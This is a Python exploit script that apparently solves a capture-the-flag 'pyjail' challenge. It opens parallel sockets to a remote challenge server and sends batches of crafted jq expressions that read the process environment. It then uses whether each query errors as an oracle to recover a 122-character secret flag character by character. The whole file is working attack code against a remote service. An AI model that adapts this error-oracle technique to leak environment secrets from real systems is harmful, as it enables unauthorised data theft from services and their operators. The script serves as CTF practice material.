#!/usr/bin/env python3
import socket
import json
import string
import time
from concurrent.futures import ThreadPoolExecutor

import solve_remote_live

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

def worker_query(group):
    """
    Worker function to query a batch of expressions over a fresh socket.
    """
    try:
        s = socket.create_connection(("challs.pyjail.club", 20219), timeout=15)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        buf = b""
        while b"expr: " not in buf:
            chunk = s.recv(4096)
            if not chunk: break
            buf += chunk
        if b"expr: " in buf:
            buf = buf.split(b"expr: ", 1)[1]

        exprs = [item[4] for item in group]
        payload = ("\n".join(exprs) + "\n").encode()
        s.sendall(payload)
        
        answers = []
        token_re = solve_remote_live.TOKEN_RE
        while len(answers) < len(exprs):
            m = list(token_re.finditer(buf))
            if m:
                take = min(len(m), len(exprs) - len(answers))
                answers.extend(match.group(1).decode() for match in m[:take])
                buf = buf[m[take - 1].end():]
                if len(answers) == len(exprs):
                    break
                continue
            chunk = s.recv(65536)
            if not chunk: break
            buf += chunk

        s.close()
        return [(item, ans) for item, ans in zip(group, answers)]
    except Exception as e:
        print(f"[-] Worker error: {e}")
        return [(item, "error_err") for item in group]

def main():
    length = 122
    charset = string.ascii_lowercase + string.digits + "_{}"
    
    flag = ["?"] * length
    flag[0:5] = list("jail{")
    flag[-1] = "}"
    
    print("[*] Building parallel dual-direction query plan...")
    query_plan = [] # list of (pos, char, is_reverse, chain_val, query_expr)
    
    for pos in range(5, length - 1):
        for c in string.ascii_lowercase + string.digits + "_":
            v = ord(c)
            # Forward add
            val_fwd = pos + v
            if val_fwd in CHAINS:
                pred = predicate(CHAINS[val_fwd])
                expr = f"env|flatten|sort|last|explode|tostream|flatten|add|{pred}|error"
                query_plan.append((pos, c, False, val_fwd, expr))
            
            # Reverse add
            val_rev = (length - 1 - pos) + v
            if val_rev in CHAINS:
                pred = predicate(CHAINS[val_rev])
                expr = f"env|flatten|sort|last|explode|reverse|implode|explode|tostream|flatten|add|{pred}|error"
                query_plan.append((pos, c, True, val_rev, expr))

    print(f"[+] Total query plan items: {len(query_plan)}")

    # Group into batches of 32 queries
    batch_size = 32
    groups = [query_plan[i : i + batch_size] for i in range(0, len(query_plan), batch_size)]

    t0 = time.time()
    results = []
    
    # Use 2 parallel workers (JAIL_CONNS_PER_IP = 2 limit)
    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = [executor.submit(worker_query, group) for group in groups]
        for f in futures:
            results.extend(f.result())

    t1 = time.time()
    print(f"[+] All queries finished in {t1 - t0:.2f}s!")

    # Perform dual-direction intersection matching per position
    fwd_matches = {} # pos -> set of chars
    rev_matches = {} # pos -> set of chars

    for (pos, c, is_rev, val, expr), ans in results:
        if ans == "error":
            if is_rev:
                rev_matches.setdefault(pos, set()).add(c)
            else:
                fwd_matches.setdefault(pos, set()).add(c)

    # Disambiguate each position
    ambiguous_count = 0
    missing_count = 0

    for pos in range(5, length - 1):
        f_chars = fwd_matches.get(pos, set())
        r_chars = rev_matches.get(pos, set())
        
        # Intersection of forward and reverse matches
        exact = f_chars & r_chars
        if len(exact) == 1:
            flag[pos] = list(exact)[0]
        elif len(exact) > 1:
            ambiguous_count += 1
            print(f"[!] Pos {pos:3d}: multiple intersection matches {exact}")
        else:
            # Fallback if one direction had missing chain
            if len(f_chars) == 1:
                flag[pos] = list(f_chars)[0]
            elif len(r_chars) == 1:
                flag[pos] = list(r_chars)[0]
            else:
                missing_count += 1

    final_flag = "".join(flag)
    print("\n" + "="*80)
    print(f"[+] RECOVERED FLAG: {final_flag}")
    print("="*80)
    print(f"Stats: {flag.count('?')} unknown, {ambiguous_count} ambiguous, {missing_count} missing")

if __name__ == "__main__":
    main()
